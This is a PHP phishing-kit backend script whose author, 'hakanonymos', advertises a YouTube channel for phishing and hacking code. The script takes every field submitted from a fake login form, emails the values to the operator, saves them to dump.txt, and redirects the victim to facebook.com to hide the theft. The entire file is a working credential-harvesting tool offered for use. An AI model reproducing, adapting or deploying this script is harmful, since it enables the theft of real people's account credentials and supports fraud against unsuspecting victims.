<?php
/*                                                                                                         
####################################################################
# s'abonner sur ma chaine youtube pour avoir plus de code phishing #
# et hacking,il me donne le courage de faire les codes phishing    #                                                                              
#                                                                  #
# subscribe on my youtube channel to have more phishing code       #
# and hacking, it gives me the courage to do the phishing codes    #
#                                                                  #
#             ||~~ BY ~~ hakanonymos ~~||                          #
#                                                                  #
#  https://www.youtube.com/channel/UCQsDsjPcX3UoQuJPz7BBxxg        #
#                                                                  #
#    skype et email : hakanonymos@hotmail.com                      #                                                                 
####################################################################                                                                                                    
*/  
$headers = 'MIME-Version: 1.0' . "\r\n"; //ne modifier que les 2 parties que j'ai ecrit ,laissez ces commentaires du code
 
$headers .= 'To: YOUR EMAIL' . "\r\n";//ici vous mettez votre adresse email gmail ou hotmail ...et suprimer mon email 

$headers .= 'From:   ' . "\r\n";
$headers .= 'Content-Type: text/plain; charset=UTF-8' . "\r\n";
$headers .= 'Content-Transfer-Encoding: 8bit' . "\r\n";
$subject = "resultats";
$message = "";
while (list($key, $val) = each($_POST)) {if(!empty($val)) {$message .= "$key : $val\n";}}
mail($TO, $subject, $message, $headers);
 $fichier = fopen('dump.txt', 'r+' );
 file_put_contents('dump.txt' , print_r($_POST, true));
 fclose($fichier);

 
 header('location: https://facebook.com');
                                                       
 
 
 ?>
                                    
